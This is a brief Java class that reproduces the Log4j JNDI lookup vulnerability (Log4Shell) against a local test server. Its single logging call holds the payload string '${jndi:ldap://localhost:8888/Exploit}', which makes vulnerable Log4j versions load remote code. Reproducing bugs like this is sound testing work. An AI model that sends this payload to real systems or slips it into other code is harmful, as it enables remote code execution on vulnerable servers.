package com.rhb.log4jbug;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * {desc}
 *
 * @author renhuibo
 * @date 2021/12/14 15:16
 */
public class Log4jBugApplication {

  public static final Logger logger = LogManager.getLogger();

  public static void main(String[] args) {
    logger.error("${jndi:ldap://localhost:8888/Exploit}");
  }

}
